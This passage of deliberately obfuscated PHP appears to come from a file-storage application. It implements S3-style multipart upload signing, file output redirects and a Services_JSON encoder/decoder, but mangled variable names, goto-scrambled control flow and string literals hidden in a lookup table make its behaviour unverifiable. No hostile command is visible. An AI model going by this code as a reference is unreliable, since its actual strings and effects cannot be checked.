$fíİİøò´[8] . $this->pathEncode($D­Šƒƒã½÷), $fíİİøò´[210] => $f¬¡©ÖÇ‹Œ, $fíİİøò´[89] => $D­Šƒƒã½÷); } public function multiUploadAuthData($BŒô…•ª¼º, $E Å—Œ°‘÷ = array()) { goto eåÅëïñÒ„; eŒµÕ ¿İÏ: if (isset($E Å—Œ°‘÷[$FÎñ…íêğ[1235]])) { $EœÔÃ…“ª„[$FÎñ…íêğ[1236]] = $E Å—Œ°‘÷[$FÎñ…íêğ[1235]]; } $dù×œÔ­Áà = explode($FÎñ…íêğ[171], $this->getHost()); $A¾Ù÷’Ôê‘ = array($FÎñ…íêğ[1237] => $dù×œÔ­Áà[1], $FÎñ…íêğ[1238] => $FÎñ…íêğ[33], $FÎñ…íêğ[199] => $FÎñ…íêğ[116], $FÎñ…íêğ[1150] => $E Å—Œ°‘÷[$FÎñ…íêğ[77]]); goto eï³‡‹¨’†; eï³‡‹¨’†: $E‡ÃëÖŒ•¹ = $FÎñ…íêğ[214]; $B´™ÜòƒŒØ = $FÎñ…íêğ[8] . $this->pathEncode($d§ŸƒÔ†êŒ) . $cÍ£¡¥âß°; $eˆ¤É´„¿Š = $this->client->__getSignatureV4($EœÔÃ…“ª„, $A¾Ù÷’Ôê‘, $E‡ÃëÖŒ•¹, $B´™ÜòƒŒØ); goto f•— à”; f•— à”: if (strpos($cÍ£¡¥âß°, $FÎñ…íêğ[213]) === 0) { if (isset($EœÔÃ…“ª„[$FÎñ…íêğ[1236]])) { $fĞ‚ì©å» = $EœÔÃ…“ª„[$FÎñ…íêğ[1236]]; } else { if (isset($eˆ¤É´„¿Š[$FÎñ…íêğ[1236]])) { $fĞ‚ì©å» = $eˆ¤É´„¿Š[$FÎñ…íêğ[1236]]; } else { $fĞ‚ì©å» = hash($FÎñ…íêğ[1148], $FÎñ…íêğ[33]); } } return array($FÎñ…íêğ[220] => $eˆ¤É´„¿Š[$FÎñ…íêğ[220]], $FÎñ…íêğ[1236] => $fĞ‚ì©å», $FÎñ…íêğ[210] => $eˆ¤É´„¿Š[$FÎñ…íêğ[1239]]); } return $eˆ¤É´„¿Š[$FÎñ…íêğ[220]]; goto f¦” ÂÌ; eåÅëïñÒ„: $FÎñ…íêğ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $cÍ£¡¥âß° = isset($E Å—Œ°‘÷[$FÎñ…íêğ[160]]) ? $E Å—Œ°‘÷[$FÎñ…íêğ[160]] : $FÎñ…íêğ[33]; $d§ŸƒÔ†êŒ = $E Å—Œ°‘÷[$FÎñ…íêğ[89]]; goto dµˆÜİ“Ë„; dµˆÜİ“Ë„: unset($E Å—Œ°‘÷[$FÎñ…íêğ[89]]); if (isset($E Å—Œ°‘÷[$FÎñ…íêğ[211]])) { return $this->listUploadParts($d§ŸƒÔ†êŒ, $E Å—Œ°‘÷); } $EœÔÃ…“ª„ = array(); goto eŒµÕ ¿İÏ; f¦” ÂÌ: } public function listUploadParts($BåÀ„ï†ĞŒ, $f¹Üé»‡« = array()) { goto d¸®‘Ú¢š; f±Ùàœ¼‹: $E’ÆÌ£Ğíù = $this->client->__getSignatureV4($aµÉ“Óç¿, $bë¼íâöó…, $C¸ÍÀÂÀÑ, $eæ½Şğ¦†œ, $BÁ†«à…èš); return array($dËŠÒ«»¤­[220] => $E’ÆÌ£Ğíù[$dËŠÒ«»¤­[220]], $dËŠÒ«»¤­[210] => $E’ÆÌ£Ğíù[$dËŠÒ«»¤­[1239]], $dËŠÒ«»¤­[222] => $c¸¯†ÕÊ®Ã, $dËŠÒ«»¤­[1236] => $E’ÆÌ£Ğíù[$dËŠÒ«»¤­[1236]]); goto B”óÆóÓ„Ó; d‡Á©¼òŒ: $BÁ†«à…èš .= $dËŠÒ«»¤­[1243]; $aµÉ“Óç¿ = array(); $b÷Œï£™Î³ = explode($dËŠÒ«»¤­[171], $this->getHost()); goto D§†õªŠÕ; d³´•‘–ÖË: if (!$c¸¯†ÕÊ®Ã) { return !1; } $BÁ†«à…èš = $dËŠÒ«»¤­[1240]; foreach ($c¸¯†ÕÊ®Ã as $FÕƒã„ÁÔ) { $BÁ†«à…èš .= $dËŠÒ«»¤­[1241] . "\x3c\120\x61\x72\x74\116\165\x6d\x62\145\162\x3e{$FÕƒã„ÁÔ[$dËŠÒ«»¤­[1192]]}\x3c\57\120\141\x72\x74\116\x75\155\x62\x65\162\x3e\xa" . "\x3c\x45\124\x61\x67\x3e{$FÕƒã„ÁÔ[$dËŠÒ«»¤­[1193]]}\x3c\57\x45\124\x61\147\x3e\12" . $dËŠÒ«»¤­[1242]; } goto d‡Á©¼òŒ; D§†õªŠÕ: $bë¼íâöó… = array($dËŠÒ«»¤­[1237] => $b÷Œï£™Î³[1], $dËŠÒ«»¤­[199] => $dËŠÒ«»¤­[116], $dËŠÒ«»¤­[1150] => strlen($BÁ†«à…èš)); $C¸ÍÀÂÀÑ = $dËŠÒ«»¤­[212]; $eæ½Şğ¦†œ = $dËŠÒ«»¤­[8] . $this->pathEncode($BåÀ„ï†ĞŒ) . $f¹Üé»‡«[$dËŠÒ«»¤­[160]]; goto f±Ùàœ¼‹; d¸®‘Ú¢š: $dËŠÒ«»¤­ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Bïåà¬Ü = str_replace($dËŠÒ«»¤­[221], $dËŠÒ«»¤­[33], $f¹Üé»‡«[$dËŠÒ«»¤­[160]]); $c¸¯†ÕÊ®Ã = $this->client->listParts($this->bucket, $BåÀ„ï†ĞŒ, $Bïåà¬Ü); goto d³´•‘–ÖË; B”óÆóÓ„Ó: } public function link($eª»Ì¶«Ä, $CÅï„®ŒÚ— = array()) { return parent::link($eª»Ì¶«Ä, $CÅï„®ŒÚ—); } public function fileOut($D§’Çµ‡Ì, $aÒî‡µ„ì = false, $c‰¼Ü³ï»‹ = false, $C™‚ÑÅù³ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[´Ù×Íå‘ÄõÛ][1244])) { return parent::fileOutServer($D§’Çµ‡Ì, $aÒî‡µ„ì, $c‰¼Ü³ï»‹, $C™‚ÑÅù³); } parent::fileOut($D§’Çµ‡Ì, $aÒî‡µ„ì, $c‰¼Ü³ï»‹, $C™‚ÑÅù³); } public function fileOutImage($c¡Ê˜áÏ…, $eÕäÇ™ÊŒ¾ = 250) { if (strstr($this->endpoint, $_SERVER[´Ù×Íå‘ÄõÛ][1244])) { return parent::fileOutImageServer($c¡Ê˜áÏ…, $eÕäÇ™ÊŒ¾); } parent::fileOutImage($c¡Ê˜áÏ…, $eÕäÇ™ÊŒ¾); } public function fileOutLink($c®•ÚÉµ†´) { $F­ğƒ¸É×¢ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (substr($c®•ÚÉµ†´, 0, 7) == $F­ğƒ¸É×¢[1119]) { $c®•ÚÉµ†´ = $F­ğƒ¸É×¢[1120] . substr($c®•ÚÉµ†´, 7); } header($F­ğƒ¸É×¢[156] . $c®•ÚÉµ†´); die; } public function getHost() { $d²–Œ¦’Àö =& $_SERVER[´Ù×Íå‘ÄõÛ]; $AÖ®£·¡•Ó = str_rtrim(parent::getHost(), $d²–Œ¦’Àö[8] . $this->bucket); $AÖ®£·¡•Ó = explode($d²–Œ¦’Àö[171], $AÖ®£·¡•Ó); return $AÖ®£·¡•Ó[0] . $d²–Œ¦’Àö[171] . $this->bucket . $d²–Œ¦’Àö[91] . $AÖ®£·¡•Ó[1]; } } goto f†¡¯¡³; fÏÚ·‚Œò¹: class Services_JSON { function __construct($A¯õ…Ï÷ = 0) { $this->use = $A¯õ…Ï÷; } function utf162utf8($C²§³¥ë‘¨) { $d“‡òÂîÛĞ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (function_exists($d“‡òÂîÛĞ[68])) { return mb_convert_encoding($C²§³¥ë‘¨, $d“‡òÂîÛĞ[1594], $d“‡òÂîÛĞ[1946]); } $A¥‡„³¬İ– = ord($C²§³¥ë‘¨[0]) << 8 | ord($C²§³¥ë‘¨[1]); switch (!0) { case (127 & $A¥‡„³¬İ–) == $A¥‡„³¬İ–: return chr(127 & $A¥‡„³¬İ–); case (2047 & $A¥‡„³¬İ–) == $A¥‡„³¬İ–: return chr(192 | $A¥‡„³¬İ– >> 6 & 31) . chr(128 | $A¥‡„³¬İ– & 63); case (65535 & $A¥‡„³¬İ–) == $A¥‡„³¬İ–: return chr(224 | $A¥‡„³¬İ– >> 12 & 15) . chr(128 | $A¥‡„³¬İ– >> 6 & 63) . chr(128 | $A¥‡„³¬İ– & 63); } return $d“‡òÂîÛĞ[33]; } function utf82utf16($F§õÆ„ï¨µ) { $dºäê›¥È– =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (function_exists($dºäê›¥È–[68])) { return mb_convert_encoding($F§õÆ„ï¨µ, $dºäê›¥È–[1946], $dºäê›¥È–[1594]); } switch (strlen($F§õÆ„ï¨µ)) { case 1: return $F§õÆ„ï¨µ; case 2: return chr(7 & ord($F§õÆ„ï¨µ[0]) >> 2) . chr(192 & ord($F§õÆ„ï¨µ[0]) << 6 | 63 & ord($F§õÆ„ï¨µ[1])); case 3: return chr(240 & ord($F§õÆ„ï¨µ[0]) << 4 | 15 & ord($F§õÆ„ï¨µ[1]) >> 2) . chr(192 & ord($F§õÆ„ï¨µ[1]) << 6 | 127 & ord($F§õÆ„ï¨µ[2])); } return $dºäê›¥È–[33]; } function encode($e£§¿š¶) { $A¥¥Ş¶êÍ =& $_SERVER[´Ù×Íå‘ÄõÛ]; switch (gettype($e£§¿š¶)) { case $A¥¥Ş¶êÍ[1605]: return $e£§¿š¶ ? $A¥¥Ş¶êÍ[1604] : $A¥¥Ş¶êÍ[1606]; case $A¥¥Ş¶êÍ[1947]: return $A¥¥Ş¶êÍ[99]; case $A¥¥Ş¶êÍ[303]: return (int) $e£§¿š¶; case $A¥¥Ş¶êÍ[278]: case $A¥¥Ş¶êÍ[277]: return (double) $e£§¿š¶; case $A¥¥Ş¶êÍ[312]: $aÅ–èø°‰  = $A¥¥Ş¶êÍ[33]; $BÜÆè§àÂ¼ = strlen($e£§¿š¶); for ($FÅ„ÔÇ‘¯Ğ = 0; $FÅ„ÔÇ‘¯Ğ < $BÜÆè§àÂ¼; ++$FÅ„ÔÇ‘¯Ğ) { $Fë„…Š°¸â = ord($e£§¿š¶[$FÅ„ÔÇ‘¯Ğ]); switch (!0) { case $Fë„…Š°¸â == 8: $aÅ–èø°‰  .= $A¥¥Ş¶êÍ[1948]; break; case $Fë„…Š°¸â == 9: $aÅ–èø°‰  .= $A¥¥Ş¶êÍ[1581]; break; case $Fë„…Š°¸â == 10: $aÅ–èø°‰  .= $A¥¥Ş¶êÍ[1579]; break; case $Fë„…Š°¸â == 12: $aÅ–èø°‰  .= $A¥¥Ş¶êÍ[1949]; break; case $Fë„…Š°¸â == 13: $aÅ–èø°‰  .= $A¥¥Ş¶êÍ[1580]; break; case $Fë„…Š°¸â == 34: case $Fë„…Š°¸â == 47: case $Fë„…Š°¸â == 92: $aÅ–èø°‰  .= $A¥¥Ş¶êÍ[93] . $e£§¿š¶[$FÅ„ÔÇ‘¯Ğ]; break; case $Fë„…Š°¸â >= 32 && $Fë„…Š°¸â <= 127: $aÅ–èø°‰  .= $e£§¿š¶[$FÅ„ÔÇ‘¯Ğ]; break; case ($Fë„…Š°¸â & 224) == 192: $F×ÑÅÆÓõƒ = pack($A¥¥Ş¶êÍ[1950], $Fë„…Š°¸â, ord($e£§¿š¶[$FÅ„ÔÇ‘¯Ğ + 1])); $FÅ„ÔÇ‘¯Ğ += 1; $f­Ú¾ç‚¬ê = $this->utf82utf16($F×ÑÅÆÓõƒ); $aÅ–èø°‰  .= sprintf($A¥¥Ş¶êÍ[1951], bin2hex($f­Ú¾ç‚¬ê)); break; case ($Fë„…Š°¸â & 240) == 224: $F×ÑÅÆÓõƒ = pack($A¥¥Ş¶êÍ[1950], $Fë„…Š°¸â, ord($e£§¿š¶[$FÅ„ÔÇ‘¯Ğ + 1]), ord($e£§¿š¶[$FÅ„ÔÇ‘¯Ğ + 2])); $FÅ„ÔÇ‘¯Ğ += 2; $f­Ú¾ç‚¬ê = $this->utf82utf16($F×ÑÅÆÓõƒ); $aÅ–èø°‰  .= sprintf($A¥¥Ş¶êÍ[1951], bin2hex($f­Ú¾ç‚¬ê)); break; case ($Fë„…Š°¸â & 248) == 240: $F×ÑÅÆÓõƒ = pack($A¥¥Ş¶êÍ[1950], $Fë„…Š°¸â, ord($e£§¿š¶[$FÅ„ÔÇ‘¯Ğ + 1]), ord($e£§¿š¶[$FÅ„ÔÇ‘¯Ğ + 2]), ord($e£§¿š¶[$FÅ„ÔÇ‘¯Ğ + 3])); $FÅ„ÔÇ‘¯Ğ += 3; $f­Ú¾ç‚¬ê = $this->utf82utf16($F×ÑÅÆÓõƒ); $aÅ–èø°‰  .= sprintf($A¥¥Ş¶êÍ[1951], bin2hex($f­Ú¾ç‚¬ê)); break; case ($Fë„…Š°¸â & 252) == 248: $F×ÑÅÆÓõƒ = pack($A¥¥Ş¶êÍ[1950], $Fë„…Š°¸â, ord($e£§¿š¶[$FÅ„ÔÇ‘¯Ğ + 1]), ord($e£§¿š¶[$FÅ„ÔÇ‘¯Ğ + 2]), ord($e£§¿š¶[$FÅ„ÔÇ‘¯Ğ + 3]), ord($e£§¿š¶[$FÅ„ÔÇ‘¯Ğ + 4])); $FÅ„ÔÇ‘¯Ğ += 4; $f­Ú¾ç‚¬ê = $this->utf82utf16($F×ÑÅÆÓõƒ); $aÅ–èø°‰  .= sprintf($A¥¥Ş¶êÍ[1951], bin2hex($f­Ú¾ç‚¬ê)); break; case ($Fë„…Š°¸â & 254) == 252: $F×ÑÅÆÓõƒ = pack($A¥¥Ş¶êÍ[1950], $Fë„…Š°¸â, ord($e£§¿š¶[$FÅ„ÔÇ‘¯Ğ + 1]), ord($e£§¿š¶[$FÅ„ÔÇ‘¯Ğ + 2]), ord($e£§¿š¶[$FÅ„ÔÇ‘¯Ğ + 3]), ord($e£§¿š¶[$FÅ„ÔÇ‘¯Ğ + 4]), ord($e£§¿š¶[$FÅ„ÔÇ‘¯Ğ + 5])); $FÅ„ÔÇ‘¯Ğ += 5; $f­Ú¾ç‚¬ê = $this->utf82utf16($F×ÑÅÆÓõƒ); $aÅ–èø°‰  .= sprintf($A¥¥Ş¶êÍ[1951], bin2hex($f­Ú¾ç‚¬ê)); break; } } return $A¥¥Ş¶êÍ[113] . $aÅ–èø°‰  . $A¥¥Ş¶êÍ[113]; case $A¥¥Ş¶êÍ[1952]: if (is_array($e£§¿š¶) && count($e£§¿š¶) && array_keys($e£§¿š¶) !== range(0, sizeof($e£§¿š¶) - 1)) { $E™·½äÓÂŠ = array_map(array($this, $A¥¥Ş¶êÍ[1953]), array_keys($e£§¿š¶), array_values($e£§¿š¶)); foreach ($E™·½äÓÂŠ as $fÂ²Œ±Ûš‰) { if (Services_JSON::isError($fÂ²Œ±Ûš‰)) { return $fÂ²Œ±Ûš‰; } } return $A¥¥Ş¶êÍ[1072] . join($A¥¥Ş¶êÍ[47], $E™·½äÓÂŠ) . $A¥¥Ş¶êÍ[315]; } $AÃÉñÊŒÁò = array_map(array($this, $A¥¥Ş¶êÍ[1954]), $e£§¿š¶); foreach ($AÃÉñÊŒÁò as $Cïˆ³½¡š) { if (Services_JSON::isError($Cïˆ³½¡š)) { return $Cïˆ³½¡š; } } return $A¥¥Ş¶êÍ[157] . join($A¥¥Ş¶êÍ[47], $AÃÉñÊŒÁò) . $A¥¥Ş¶êÍ[478]; case $A¥¥Ş¶êÍ[1955]: $DŞ¹³‚ë®‰ = get_object_vars($e£§¿š¶); $E™·½äÓÂŠ = array_map(array($this, $A¥¥Ş¶êÍ[1953]), array_keys($DŞ¹³‚ë®‰), array_values($DŞ¹³‚ë®‰)); foreach ($E™·½äÓÂŠ as $fÂ²Œ±Ûš‰) { if (Services_JSON::isError($fÂ²Œ±Ûš‰)) { return $fÂ²Œ±Ûš‰; } } return $A¥¥Ş¶êÍ[1072] . join($A¥¥Ş¶êÍ[47], $E™·½äÓÂŠ) . $A¥¥Ş¶êÍ[315]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $A¥¥Ş¶êÍ[99] : new Services_JSON_Error(gettype($e£§¿š¶) . $A¥¥Ş¶êÍ[1956]); } } function name_value($A×ˆºË¢¬°, $fÔÁ©‹¢) { $dÉèôª£°° = $this->encode($fÔÁ©‹¢); if (Services_JSON::isError($dÉèôª£°°)) { return $dÉèôª£°°; } return $this->encode(strval($A×ˆºË¢¬°)) . $_SERVER[´Ù×Íå‘ÄõÛ][4] . $dÉèôª£°°; } function reduce_string($CóØÛèÍ±•) { $e»õ“¾½÷¡ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $CóØÛèÍ±• = preg_replace(array($e»õ“¾½÷¡[1957], $e»õ“¾½÷¡[1958], $e»õ“¾½÷¡[1959]), $e»õ“¾½÷¡[33], $CóØÛèÍ±•); return trim($CóØÛèÍ±•); } function decode($f•ç’ ¿») { $CÈóáÄÖ… =& $_SERVER[´Ù×Íå‘ÄõÛ]; $f•ç’ ¿» = $this->reduce_string($f•ç’ ¿»); switch (strtolower($f•ç’ ¿»)) { case $CÈóáÄÖ…[1604]: return !0; case $CÈóáÄÖ…[1606]: return !1; case $CÈóáÄÖ…[99]: return null; default: $f‘È¢Î‘·ñ = array(); if (is_numeric($f•ç’ ¿»)) { return (double) $f•ç’ ¿» == (int) $f•ç’ ¿» ? (int) $f•ç’ ¿» : (double) $f•ç’ ¿»; } elseif (preg_match($CÈóáÄÖ…[1960], $f•ç’ ¿», $f‘È¢Î‘·ñ) && $f‘È¢Î‘·ñ[1] == $f‘È¢Î‘·ñ[2]) { $dÄµæâèæ‚ = substr($f•ç’ ¿», 0, 1); $dËÓ¬¼¬¬Ú = substr($f•ç’ ¿», 1, -1); $Fà˜İÁîÅ‡ = $CÈóáÄÖ…[33]; $d÷ö¯Œ§Ê° = strlen($dËÓ¬¼¬¬Ú); for ($C±¢ùµ¤‚ = 0; $C±¢ùµ¤‚ < $d÷ö¯Œ§Ê°; ++$C±¢ùµ¤‚) { $C…Ïƒ  = substr($dËÓ¬¼¬¬Ú, $C±¢ùµ¤‚, 2); $Eä˜—¤¤œ = ord($dËÓ¬¼¬¬Ú[$C±¢ùµ¤‚]); switch (!0) { case $C…Ïƒ  == $CÈóáÄÖ…[1948]: $Fà˜İÁîÅ‡ .= chr(8); ++$C±¢ùµ¤‚; break; case $C…Ïƒ  == $CÈóáÄÖ…[1581]: $Fà˜İÁîÅ‡ .= chr(9); ++$C±¢ùµ¤‚; break; case $C…Ïƒ  == $CÈóáÄÖ…[1579]: $Fà˜İÁîÅ‡ .= chr(10); ++$C±¢ùµ¤‚; break; case $C…Ïƒ  == $CÈóáÄÖ…[1949]: $Fà˜İÁîÅ‡ .= chr(12); ++$C±¢ùµ¤‚; break; case $C…Ïƒ  == $CÈóáÄÖ…[1580]: $Fà˜İÁîÅ‡ .= chr(13); ++$C±¢ùµ¤‚; break; case $C…Ïƒ  == $CÈóáÄÖ…[1361]: case $C…Ïƒ  == $CÈóáÄÖ…[1961]: case $C…Ïƒ  == $CÈóáÄÖ…[1574]: case $C…Ïƒ  == $CÈóáÄÖ…[1576]: if ($dÄµæâèæ‚ == $CÈóáÄÖ…[113] && $C…Ïƒ  != $CÈóáÄÖ…[1961] || $dÄµæâèæ‚ == $CÈóáÄÖ…[55] && $C…Ïƒ  != $CÈóáÄÖ…[1361]) { $Fà˜İÁîÅ‡ .= $dËÓ¬¼¬¬Ú[++$C±¢ùµ¤‚]; } break; case preg_match($CÈóáÄÖ…[1962], substr($dËÓ¬¼¬¬Ú, $C±¢ùµ¤‚, 6)): $d‹ùíùáê = chr(hexdec(substr($dËÓ¬¼¬¬Ú, $C±¢ùµ¤‚ + 2, 2))) . chr(hexdec(substr($dËÓ¬¼¬¬Ú, $C±¢ùµ¤‚ + 4, 2))); $Fà˜İÁîÅ‡ .= $this->utf162utf8($d‹ùíùáê); $C±¢ùµ¤‚ += 5; break; case $Eä˜—¤¤œ >= 32 && $Eä˜—¤¤œ <= 127: $Fà˜İÁîÅ‡ .= $dËÓ¬¼¬¬Ú[$C±¢ùµ¤‚]; break; case ($Eä˜—¤¤œ & 224) == 192: $Fà˜İÁîÅ‡ .= substr($dËÓ¬¼¬¬Ú, $C±¢ùµ¤‚, 2); ++$C±¢ùµ¤‚; break; case ($Eä˜—¤¤œ & 240) == 224: $Fà˜İÁîÅ‡ .= substr($dËÓ¬¼¬¬Ú, $C±¢ùµ¤‚, 3); $C±¢ùµ¤‚ += 2; break; case ($Eä˜—¤¤œ & 248) == 240: $Fà˜İÁîÅ‡ .= substr($dËÓ¬¼¬¬Ú, $C±¢ùµ¤‚, 4); $C±¢ùµ¤‚ += 3; break; case ($Eä˜—¤¤œ & 252) == 248: $Fà˜İÁîÅ‡ .= substr($dËÓ¬¼¬¬Ú, $C±¢ùµ¤‚, 5); $C±¢ùµ¤‚ += 4; break; case ($Eä˜—¤¤œ & 254) == 252: $Fà˜İÁîÅ‡ .= substr($dËÓ¬¼¬¬Ú, $C±¢ùµ¤‚, 6); $C±¢ùµ¤‚ += 5; break; } } return $Fà˜İÁîÅ‡; } elseif (preg_match($CÈóáÄÖ…[1963], $f•ç’ ¿») || preg_match($CÈóáÄÖ…[1964], $f•ç’ ¿»)) { goto Då°Ì÷¡†ï; Då°Ì÷¡†ï: if ($f•ç’ ¿»[0] == $CÈóáÄÖ…[157]) { $f„ô÷” ŒÏ = array(SERVICES_JSON_IN_ARR); $A¤¡¨ŒÓĞõ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $f„ô÷” ŒÏ = array(SERVICES_JSON_IN_OBJ); $DÅ‚õÇéÑ = array(); } else { $f„ô÷” ŒÏ = array(SERVICES_JSON_IN_OBJ); $DÅ‚õÇéÑ = new stdClass(); } } array_push($f„ô÷” ŒÏ, array($CÈóáÄÖ…[1965] => SERVICES_JSON_SLICE, $CÈóáÄÖ…[263] => 0, $CÈóáÄÖ…[1966] => !1)); $dËÓ¬¼¬¬Ú = substr($f•ç’ ¿», 1, -1); goto c×æìñ—¥í; EÈ›Œ¦Âì: for ($C±¢ùµ¤‚ = 0; $C±¢ùµ¤‚ <= $d÷ö¯Œ§Ê°; ++$C±¢ùµ¤‚) { $e‚ï‡Œ° = end($f„ô÷” ŒÏ); $C…Ïƒ  = substr($dËÓ¬¼¬¬Ú, $C±¢ùµ¤‚, 2); if ($C±¢ùµ¤‚ == $d÷ö¯Œ§Ê° || $dËÓ¬¼¬¬Ú[$C±¢ùµ¤‚] == $CÈóáÄÖ…[47] && $e‚ï‡Œ°[$CÈóáÄÖ…[1965]] == SERVICES_JSON_SLICE) { $EšŒÆ‡¦« = substr($dËÓ¬¼¬¬Ú, $e‚ï‡Œ°[$CÈóáÄÖ…[263]], $C±¢ùµ¤‚ - $e‚ï‡Œ°[$CÈóáÄÖ…[263]]); array_push($f„ô÷” ŒÏ, array($CÈóáÄÖ…[1965] => SERVICES_JSON_SLICE, $CÈóáÄÖ…[263] => $C±¢ùµ¤‚ + 1, $CÈóáÄÖ…[1966] => !1)); if (reset($f„ô÷” ŒÏ) == SERVICES_JSON_IN_ARR) { array_push($A¤¡¨ŒÓĞõ, $this->decode($EšŒÆ‡¦«)); } elseif (reset($f„ô÷” ŒÏ) == SERVICES_JSON_IN_OBJ) { $d¦‹ƒµ©¿Ú = array(); if (preg_match($CÈóáÄÖ…[1967], $EšŒÆ‡¦«, $d¦‹ƒµ©¿Ú)) { $C‰¨ˆä¥ô = $this->decode($d¦‹ƒµ©¿Ú[1]); $e¹á“¦¾‚¯ = $this->decode($d¦‹ƒµ©¿Ú[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $DÅ‚õÇéÑ[$C‰¨ˆä¥ô] = $e¹á“¦¾‚¯; } else { $DÅ‚õÇéÑ->{$C‰¨ˆä¥ô} = $e¹á“¦¾‚¯; } } elseif (preg_match($CÈóáÄÖ…[1968], $EšŒÆ‡¦«, $d¦‹ƒµ©¿Ú)) { $C‰¨ˆä¥ô = $d¦‹ƒµ©¿Ú[1]; $e¹á“¦¾‚¯ = $this->decode($d¦‹ƒµ©¿Ú[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $DÅ‚õÇéÑ[$C‰¨ˆä¥ô] = $e¹á“¦¾‚¯; } else { $DÅ‚õÇéÑ->{$C‰¨ˆä¥ô} = $e¹á“¦¾‚¯; } } } } elseif (($dËÓ¬¼¬¬Ú[$C±¢ùµ¤‚] == $CÈóáÄÖ…[113] || $dËÓ¬¼¬¬Ú[$C±¢ùµ¤‚] == $CÈóáÄÖ…[55]) && $e‚ï‡Œ°[$CÈóáÄÖ…[1965]] != SERVICES_JSON_IN_STR) { array_push($f„ô÷” ŒÏ, array($CÈóáÄÖ…[1965] => SERVICES_JSON_IN_STR, $CÈóáÄÖ…[263] => $C±¢ùµ¤‚, $CÈóáÄÖ…[1966] => $dËÓ¬¼¬¬Ú[$C±¢ùµ¤‚])); } elseif ($dËÓ¬¼¬¬Ú[$C±¢ùµ¤‚] == $e‚ï‡Œ°[$CÈóáÄÖ…[1966]] && $e‚ï‡Œ°[$CÈóáÄÖ…[1965]] == SERVICES_JSON_IN_STR && (strlen(substr($dËÓ¬¼¬¬Ú, 0, $C±¢ùµ¤‚)) - strlen(rtrim(substr($dËÓ¬¼¬¬Ú, 0, $C±¢ùµ¤‚), $CÈóáÄÖ…[93]))) % 2 != 1) { array_pop($f„ô÷” ŒÏ); } elseif ($dËÓ¬¼¬¬Ú[$C±¢ùµ¤‚] == $CÈóáÄÖ…[157] && in_array($e‚ï‡Œ°[$CÈóáÄÖ…[1965]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($f„ô÷” ŒÏ, array($CÈóáÄÖ…[1965] => SERVICES_JSON_IN_ARR, $CÈóáÄÖ…[263] => $C±¢ùµ¤‚, $CÈóáÄÖ…[1966] => !1)); } elseif ($dËÓ¬¼¬¬Ú[$C±¢ùµ¤‚] == $CÈóáÄÖ…[478] && $e‚ï‡Œ°[$CÈóáÄÖ…[1965]] == SERVICES_JSON_IN_ARR) { array_pop($f„ô÷” ŒÏ); } elseif ($dËÓ¬¼¬¬Ú[$C±¢ùµ¤‚] == $CÈóáÄÖ…[1072] && in_array($e‚ï‡Œ°[$CÈóáÄÖ…[1965]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($f„ô÷” ŒÏ, array($CÈóáÄÖ…[1965] => SERVICES_JSON_IN_OBJ, $CÈóáÄÖ…[263] => $C±¢ùµ¤‚, $CÈóáÄÖ…[1966] => !1)); } elseif ($dËÓ¬¼¬¬Ú[$C±¢ùµ¤‚] == $CÈóáÄÖ…[315] && $e‚ï‡Œ°[$CÈóáÄÖ…[1965]] == SERVICES_JSON_IN_OBJ) { array_pop($f„ô÷” ŒÏ); } elseif ($C…Ïƒ  == $CÈóáÄÖ…[1969] && in_array($e‚ï‡Œ°[$CÈóáÄÖ…[1965]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($f„ô÷” ŒÏ, array($CÈóáÄÖ…[1965] => SERVICES_JSON_IN_CMT, $CÈóáÄÖ…[263] => $C±¢ùµ¤‚, $CÈóáÄÖ…[1966] => !1)); $C±¢ùµ¤‚++; } elseif ($C…Ïƒ  == $CÈóáÄÖ…[1970] && $e‚ï‡Œ°[$CÈóáÄÖ…[1965]] == SERVICES_JSON_IN_CMT) { array_pop($f„ô÷” ŒÏ); $C±¢ùµ¤‚++; for ($FïçÖˆ«‰¥ = $e‚ï‡Œ°[$CÈóáÄÖ…[263]]; $FïçÖˆ«‰¥ <= $C±¢ùµ¤‚; ++$FïçÖˆ«‰¥) { $dËÓ¬¼¬¬Ú = substr_replace($dËÓ¬¼¬¬Ú, $CÈóáÄÖ…[50], $FïçÖˆ«‰¥, 1); } } } if (reset($f„ô÷” ŒÏ) == SERVICES_JSON_IN_ARR) { return $A¤¡¨ŒÓĞõ; } elseif (reset($f„ô÷” ŒÏ) == SERVICES_JSON_IN_OBJ) { return $DÅ‚õÇéÑ; } goto cßŠØ™Ïâ; c×æìñ—¥í: $dËÓ¬¼¬¬Ú = $this->reduce_string($dËÓ¬¼¬¬Ú); if ($dËÓ¬¼¬¬Ú == $CÈóáÄÖ…[33]) { if (reset($f„ô÷” ŒÏ) == SERVICES_JSON_IN_ARR) { return $A¤¡¨ŒÓĞõ; } else { return $DÅ‚õÇéÑ; } } $d÷ö¯Œ§Ê° = strlen($dËÓ¬¼¬¬Ú); goto EÈ›Œ¦Âì; cßŠØ™Ïâ: } } } function isError($b“âêÍ£•ƒ, $c¿ù°Ÿ× = null) { $Eƒ ®ÉÅŞ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (class_exists($Eƒ ®ÉÅŞ[1971])) { return PEAR::isError($b“âêÍ£•ƒ, $c¿ù°Ÿ×); } elseif (is_object($b“âêÍ£•ƒ) && (get_class($b“âêÍ£•ƒ) == $Eƒ ®ÉÅŞ[1972] || is_subclass_of($b“âêÍ£•ƒ, $Eƒ ®ÉÅŞ[1972]))) { return !0; } return !1; } } if (class_exists($_SERVER[´Ù×Íå‘ÄõÛ][1973])) { class Services_JSON_Error extends PEAR_Error { function __construct($f ƒ¿˜–ƒ© = "\x75\156\153\x6e\157\x77\156\40\145\x72\x72\157\x72", $BãçÓ¼êœŠ = null, $AĞ ì¸³Åå = null, $FÛĞ™®âº« = null, 